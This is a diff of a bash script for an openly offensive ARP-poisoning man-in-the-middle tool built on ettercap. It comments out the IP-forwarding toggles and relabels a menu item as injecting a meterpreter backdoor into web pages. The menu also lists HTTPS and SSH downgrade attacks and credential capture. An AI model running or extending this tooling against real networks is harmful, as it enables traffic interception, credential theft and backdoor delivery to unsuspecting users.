@@ -240,7 +240,7 @@ gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "'morpheus arp poison se
     xterm -T "MORPHEUS - COMPILING" -geometry 90x26 -e "etterfilter $IPATH/filters/packet_drop.eft -o $IPATH/output/packet_drop.ef && sleep 3"
     sleep 1
     # port-forward
-    echo "1" > /proc/sys/net/ipv4/ip_forward
+    # echo "1" > /proc/sys/net/ipv4/ip_forward
     cd $IPATH/logs
 
       # run mitm+filter
@@ -271,7 +271,7 @@ gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "'morpheus arp poison se
   echo ${BlueF}[☠]${white} Cleaning recent files${RedF}!${Reset};
   mv $IPATH/filters/packet_drop.bk $IPATH/filters/packet_drop.eft > /dev/null 2>&1
   # port-forward
-  echo "0" > /proc/sys/net/ipv4/ip_forward
+  # echo "0" > /proc/sys/net/ipv4/ip_forward
   sleep 2
   rm $IPATH/output/packet_drop.ef > /dev/null 2>&1
   cd $IPATH
@@ -323,7 +323,7 @@ sleep 1
     xterm -T "MORPHEUS - COMPILING" -geometry 90x26 -e "etterfilter $IPATH/filters/img_replace.eft -o $IPATH/output/img_replace.ef && sleep 3"
     sleep 1
     # port-forward
-    echo "1" > /proc/sys/net/ipv4/ip_forward
+    # echo "1" > /proc/sys/net/ipv4/ip_forward
     cd $IPATH/logs
 
       # run mitm+filter
@@ -356,7 +356,7 @@ sleep 1
   echo ${BlueF}[☠]${white} Cleaning recent files${RedF}!${Reset};
   mv $IPATH/filters/img_replace.bk $IPATH/filters/img_replace.eft > /dev/null 2>&1
   # port-forward
-  echo "0" > /proc/sys/net/ipv4/ip_forward
+  # echo "0" > /proc/sys/net/ipv4/ip_forward
   sleep 2
   rm $IPATH/output/img_replace.ef > /dev/null 2>&1
   cd $IPATH
@@ -415,7 +415,7 @@ fil_one=$(zenity --title="☠ HOST TO FILTER ☠" --text "example: $IP\nchose fi
     xterm -T "MORPHEUS - COMPILING" -geometry 90x26 -e "etterfilter $IPATH/filters/firewall.eft -o $IPATH/output/firewall.ef && sleep 3"
     sleep 1
     # port-forward
-    echo "1" > /proc/sys/net/ipv4/ip_forward
+    # echo "1" > /proc/sys/net/ipv4/ip_forward
     cd $IPATH/logs
 
       # run mitm+filter
@@ -447,7 +447,7 @@ fil_one=$(zenity --title="☠ HOST TO FILTER ☠" --text "example: $IP\nchose fi
   echo ${BlueF}[☠]${white} Cleaning recent files${RedF}!${Reset};
   mv $IPATH/filters/firewall.bk $IPATH/filters/firewall.eft > /dev/null 2>&1
   # port-forward
-  echo "0" > /proc/sys/net/ipv4/ip_forward
+  # echo "0" > /proc/sys/net/ipv4/ip_forward
   sleep 2
   rm $IPATH/output/firewall.ef > /dev/null 2>&1
   cd $IPATH
@@ -495,7 +495,7 @@ gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "'morpheus arp poison se
     xterm -T "MORPHEUS - COMPILING" -geometry 90x26 -e "etterfilter $IPATH/filters/template.eft -o $IPATH/output/template.ef && sleep 3"
     sleep 1
     # port-forward
-    echo "1" > /proc/sys/net/ipv4/ip_forward
+    # echo "1" > /proc/sys/net/ipv4/ip_forward
     cd $IPATH/logs
 
       # run mitm+filter
@@ -527,7 +527,7 @@ gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "'morpheus arp poison se
   echo ${BlueF}[☠]${white} Cleaning recent files${RedF}!${Reset};
   mv $IPATH/filters/template.bk $IPATH/filters/template.eft > /dev/null 2>&1
   # port-forward
-  echo "0" > /proc/sys/net/ipv4/ip_forward
+  # echo "0" > /proc/sys/net/ipv4/ip_forward
   sleep 2
   rm $IPATH/output/template.ef > /dev/null 2>&1
   cd $IPATH
@@ -648,7 +648,7 @@ cat << !
     |   5    -  https downgrade attack demo      [ replace: https     ] |
     |   6    -  ssh downgrade attack demo        [ replace: SSH-1.99  ] |
     |   7    -  Rotate website document 180º     [ CSS3 injection     ] |
-    |   8    -  Inject backdoor into <head>      [ executable.exe     ] |
+    |   8    -  Inject backdoor into </title>    [ meterpreter.exe    ] |
     |   9    -  firewall filter tcp/udp          [report/capture_creds] |
     |                                                                   |
     |   W    -  Write your own filter            [ use morpheus tool  ] |
